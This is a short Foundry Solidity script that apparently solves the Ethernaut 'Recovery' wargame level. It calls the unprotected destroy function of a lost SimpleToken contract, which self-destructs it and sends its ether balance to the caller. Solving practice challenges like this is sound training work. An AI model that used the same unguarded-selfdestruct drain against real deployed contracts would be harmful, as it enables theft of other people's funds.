// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/17_Recovery.sol";

contract AttackerRecoveryScript is Script {
    Recovery recovery = Recovery(vm.envAddress("INSTANCE"));

    function run() external {
        vm.startBroadcast();

        // Go to etherscan to find address, then set TOKEN env and run...
        SimpleToken simpleToken = SimpleToken(payable(vm.envAddress("TOKEN")));

        console.log("Current balance :", address(simpleToken).balance);
        simpleToken.destroy(msg.sender);
        console.log("New balance :", address(simpleToken).balance);

        vm.stopBroadcast();
    }
}
